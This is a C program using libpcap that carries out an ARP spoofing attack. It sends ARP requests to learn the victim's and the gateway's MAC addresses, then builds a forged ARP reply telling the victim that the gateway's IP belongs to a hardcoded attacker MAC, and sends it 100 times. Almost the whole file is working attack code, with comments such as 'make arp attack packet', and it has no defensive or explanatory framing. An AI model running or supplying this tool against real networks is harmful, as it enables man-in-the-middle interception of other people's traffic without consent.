#include <pcap.h>
#include <stdio.h>
#include <netinet/in.h>
#include <stdint.h>
#include <string.h>

#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806

#define IPTYPE_ICMP 0x01
#define IPTYPE_TCP 0x06
#define IPTYPE_UDP 0x11

typedef struct my_ether_header 
{
	u_char ether_dmac[6];
	u_char ether_smac[6];
	u_short ether_type;
}my_eth;

typedef my_eth*  my_peth;

typedef struct my_ip_header
{
	u_char ip_hl:4, ip_v:4;	//header length
	u_char ip_tos;	//type of service
	u_short ip_len;	//total length
	u_short ip_id;	//identification
	u_short ip_ip_off;	//fragment offset field
	u_char ip_ttl;		//time to live
	u_char ip_p;		//protocol -> next tcp protocol
	u_short ip_sum;	//checksum
	struct in_addr ip_src, ip_dst; //source ip; destination ip
}my_ip;

typedef my_ip* my_pip;

#define ARP_REQUEST 1
#define ARP_REPLY 2


typedef struct my_arp_header
{
	u_int16_t ar_hrd;
	u_int16_t ar_pro;         /* format of protocol address */
	u_int8_t  ar_hln;         /* length of hardware address */
	u_int8_t  ar_pln;         /* length of protocol addres */
	u_int16_t ar_op;          /* operation type */
	uint8_t arp_sha[6];
	uint8_t arp_spa[4];
	uint8_t arp_tha[6];
	uint8_t arp_tpa[4];
}my_arp;

typedef my_arp* my_parp;

typedef struct my_tcp_header
{
	u_short tcp_sport;
	u_short tcp_dport;
	uint32_t tcp_seq;
	uint32_t tcp_ack;
	u_char tcp_x2:4, tcp_off:4;

	u_char tcp_flags;

	u_short tcp_win;
	u_short tcp_sum;
	u_short tcp_urp;
}my_tcp;

typedef my_tcp* my_ptcp;


//Data print function
void Print_Ether_Info(my_peth ehdr_pointer);
void Print_extra_data(u_char *str, int len);




int main(int argc, char *argv[])
{
	pcap_t *handle;		/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[] = "arp";	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr *header;
	uint32_t sender_IP, gateway_IP;
	uint8_t sender_MAC[6] = {0, };
	uint8_t gateway_MAC[6] = {0, };	/* The header that pcap gives us */
	const u_char *packet;		/* The actual packet */
	int pcap_ret = 0;
	unsigned short my_arp_op = 0;
	uint32_t tmp;
	
	int data_len = 0; // caplen - sizeof(eth) - sizeof(ip) - sizeof(tcp) = data len

	my_peth ehdr_pointer = NULL;
	my_pip iphdr_pointer = NULL;
	my_ptcp tcphdr_pointer = NULL;
	my_parp arphdr_pointer = NULL;

	void* tmp_ptr = NULL;

	u_char *data_pointer = NULL;

	int i = 50;
	int j = 0;

	short eth_type = 0;
	char ip_type = 0;

	char cmd[256] = {0, };

	char MACbuf[20] = {0, };

	char ip_dst[20] = {0, };
	char ip_src[20] = {0, };

	char my_packet_buf[60] = {0, };


	if(argc != 4)
	{
		printf("usage  : %s <device_name> <sender IP> <gateway IP>\n", argv[0]);
		return 2;
	}
	if(!inet_aton(argv[2], (struct in_addr*)&sender_IP) ||  !inet_aton(argv[3], (struct in_addr*)&gateway_IP))
	{
		printf("Invalid IP String Try again\n");
		return 3;
	}

	/* Open the session in promiscuous mode */
	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	printf("Trying to get MAC address\n");

	/* Now make ARP packet from attacker to victim */
	ehdr_pointer = (my_peth)my_packet_buf;

	memcpy(ehdr_pointer->ether_dmac, "\xff\xff\xff\xff\xff\xff", 6 * sizeof(uint8_t));
	memcpy(ehdr_pointer->ether_smac, "\x00\x50\x56\x23\xff\xdf", 6 * sizeof(uint8_t));
	ehdr_pointer->ether_type = htons(0x0806);

	arphdr_pointer = (my_parp)(my_packet_buf + sizeof(my_eth));

	arphdr_pointer->ar_hrd = htons(0x0001);
	arphdr_pointer->ar_pro = htons(0x0800);
	arphdr_pointer->ar_hln = 0x06;
	arphdr_pointer->ar_pln = 0x04;
	arphdr_pointer->ar_op = htons(0x0001);

	memcpy(arphdr_pointer->arp_sha, "\x00\x50\x56\x23\xff\xdf", 6 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_spa, "\xc0\xa8\xc8\x80", 4 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_tha, "\x00\x00\x00\x00\x00\x00", 6 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_tpa, &sender_IP, 4 * sizeof(uint8_t));


	for(i=0;i<10;i++)
	{
		pcap_sendpacket(handle, my_packet_buf, 60);
	}

	while(1)
	{
		pcap_ret = pcap_next_ex(handle, &header, &packet);
		/* Print its length */
		if(pcap_ret == 1) /* Sucessfully read packet*/
		{
			ehdr_pointer = (my_peth)packet;
			//Ethernet p
			eth_type = ntohs(ehdr_pointer->ether_type);
			if(eth_type == ETHERTYPE_ARP)
			{
				arphdr_pointer = (my_parp)(packet + sizeof(my_eth));
				memcpy(&tmp, arphdr_pointer->arp_spa, 4 * sizeof(uint8_t));
				my_arp_op = ntohs(arphdr_pointer->ar_op);
				if( my_arp_op == ARP_REPLY && sender_IP == tmp )
				{
					printf("Sender Complete\n");
					memcpy(sender_MAC, arphdr_pointer->arp_sha, 6 * sizeof(uint8_t));
					break;
				}
	 			/* And close the session */
		 	}
		}
		else if(pcap_ret == 0)
 		{
			printf("packet buffer timeout expired\n");
 			continue;
 		}
 		else if(pcap_ret == -1)
 		{
 			printf("error occured while reading the packet\n");
 			return -1;
 		}
 		else if(pcap_ret == -2)
 		{
 			printf("read from savefile and no more read savefile\n");
 			return -2;
 		}

	}

	printf("sender MAC : %02x:%02x:%02x - %02x:%02x:%02x\n", sender_MAC[0], sender_MAC[1], sender_MAC[2], sender_MAC[3], sender_MAC[4], sender_MAC[5]);
	

	memset(my_packet_buf, 0x00, sizeof(my_packet_buf));

	ehdr_pointer = (my_peth)my_packet_buf;

	memcpy(ehdr_pointer->ether_dmac, "\xff\xff\xff\xff\xff\xff", 6 * sizeof(uint8_t));
	memcpy(ehdr_pointer->ether_smac, "\x00\x50\x56\x23\xff\xdf", 6 * sizeof(uint8_t));
	ehdr_pointer->ether_type = htons(0x0806);

	arphdr_pointer = (my_parp)(my_packet_buf + sizeof(my_eth));

	arphdr_pointer->ar_hrd = htons(0x0001);
	arphdr_pointer->ar_pro = htons(0x0800);
	arphdr_pointer->ar_hln = 0x06;
	arphdr_pointer->ar_pln = 0x04;
	arphdr_pointer->ar_op = htons(0x0001);

	memcpy(arphdr_pointer->arp_sha, "\x00\x50\x56\x23\xff\xdf", 6 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_spa, "\xc0\xa8\xc8\x80", 4 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_tha, "\x00\x00\x00\x00\x00\x00", 6 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_tpa, &gateway_IP, 4 * sizeof(uint8_t));


	for(i=0;i<10;i++)
	{
		pcap_sendpacket(handle, my_packet_buf, 60);
	}

	while(1)
	{
		pcap_ret = pcap_next_ex(handle, &header, &packet);
		/* Print its length */
		if(pcap_ret == 1) /* Sucessfully read packet*/
		{
			ehdr_pointer = (my_peth)packet;
			//Ethernet p
			eth_type = ntohs(ehdr_pointer->ether_type);
			if(eth_type == ETHERTYPE_ARP)
			{
				arphdr_pointer = (my_parp)(packet + sizeof(my_eth));
				memcpy(&tmp, arphdr_pointer->arp_spa, 4 * sizeof(uint8_t));
				my_arp_op = ntohs(arphdr_pointer->ar_op);
				if( my_arp_op == ARP_REPLY )
				{
					if( gateway_IP == tmp)
					{
						memcpy(gateway_MAC, arphdr_pointer->arp_sha, 6 * sizeof(uint8_t));
						break;
					}
					
				}
				else
					continue;
	 			/* And close the session */
		 	}
		}
		else if(pcap_ret == 0)
 		{
			printf("packet buffer timeout expired\n");
 			continue;
 		}
 		else if(pcap_ret == -1)
 		{
 			printf("error occured while reading the packet\n");
 			return -1;
 		}
 		else if(pcap_ret == -2)
 		{
 			printf("read from savefile and no more read savefile\n");
 			return -2;
 		}

	}

	printf("gateway MAC : %02x:%02x:%02x - %02x:%02x:%02x\n", gateway_MAC[0], gateway_MAC[1], gateway_MAC[2], gateway_MAC[3], gateway_MAC[4], gateway_MAC[5]);

	//make arp attack packet
	//reply packet
	//sender is gateway ip
	//but mac address is attacker's mac
	memset(my_packet_buf, 0x00, sizeof(my_packet_buf));
	
	ehdr_pointer = (my_peth)my_packet_buf;
	
	memcpy(ehdr_pointer->ether_dmac, sender_MAC, 6 * sizeof(uint8_t));
	memcpy(ehdr_pointer->ether_smac, "\x00\x50\x56\x23\xff\xdf", 6 * sizeof(uint8_t));
	ehdr_pointer->ether_type = htons(0x0806);
	
	arphdr_pointer = (my_parp)(my_packet_buf + sizeof(my_eth));
	
	arphdr_pointer->ar_hrd = htons(0x0001);
	arphdr_pointer->ar_pro = htons(0x0800);
	arphdr_pointer->ar_hln = 0x06;
	arphdr_pointer->ar_pln = 0x04;
	arphdr_pointer->ar_op = htons(0x0002);
	
	memcpy(arphdr_pointer->arp_sha, "\x00\x50\x56\x23\xff\xdf", 6 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_spa, &gateway_IP, 4 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_tha, sender_MAC, 6 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_tpa, &sender_IP, 4 * sizeof(uint8_t));

	Print_Ether_Info(ehdr_pointer);
	print_arp_info(arphdr_pointer);

	for(i=0;i<100;i++)
		pcap_sendpacket(handle, my_packet_buf, 60);

	pcap_close(handle);
	return(0);
}


void Print_Ether_Info(my_peth ehdr_pointer)
{
	printf("dest mac =  %02x:%02x:%02x - %02x:%02x:%02x\n", ehdr_pointer->ether_dmac[0], ehdr_pointer->ether_dmac[1], ehdr_pointer->ether_dmac[2], ehdr_pointer->ether_dmac[3], ehdr_pointer->ether_dmac[4], ehdr_pointer->ether_dmac[5]);
	printf("src mac = %02x:%02x:%02x - %02x:%02x:%02x\n", ehdr_pointer->ether_smac[0], ehdr_pointer->ether_smac[1], ehdr_pointer->ether_smac[2], ehdr_pointer->ether_smac[3], ehdr_pointer->ether_smac[4], ehdr_pointer->ether_smac[5]);
	printf("next protocol type : %04x\n\n", ntohs(ehdr_pointer->ether_type));
}

void Print_extra_data(u_char *str, int len)
{
	int i = len;
	int roop = i / 16;
	int rem = i % 16;
	int cur = 0;

	while(cur < roop)
	{
		for(i=0;i<16;i++)
			printf("%02x ", str[cur * 16 + i]);

		printf("\n");

		cur++;
	}

	for(i=0;i<rem;i++)
		printf("%02x ", str[cur * 16 + i]);

	printf("\n");

}

void print_arp_info(my_parp arphdr_pointer)
{
	char ip_dst[20] = {0, };
	char ip_src[20] = {0, };

	uint16_t my_arp_op;
	int j;

     
	my_arp_op = ntohs(arphdr_pointer->ar_op);
	if(my_arp_op == ARP_REQUEST)
		printf("It is arp request packet\n");
	else if(my_arp_op == ARP_REPLY)
		printf("It is arp reply packet\n");

	inet_ntop(AF_INET, (struct in_addr*)arphdr_pointer->arp_spa, ip_dst, sizeof(ip_dst));
	inet_ntop(AF_INET, (struct in_addr*)arphdr_pointer->arp_tpa, ip_src, sizeof(ip_src));
	printf("Source IP : %s\n", ip_src);
	printf("Destination IP : %s\n", ip_dst);
	printf("Source Mac : ");
	for(j=0;j<6;j++)
	{
		printf("%02x", arphdr_pointer->arp_sha[j]);
		printf("%c",  j == 5 ? '\n': ':');
	}
	printf("Destination Mac : ");
	for(j=0;j<6;j++)
	{
		printf("%02x", arphdr_pointer->arp_tha[j]);
		printf("%c", j==5 ? '\n' : ':');
	}
}



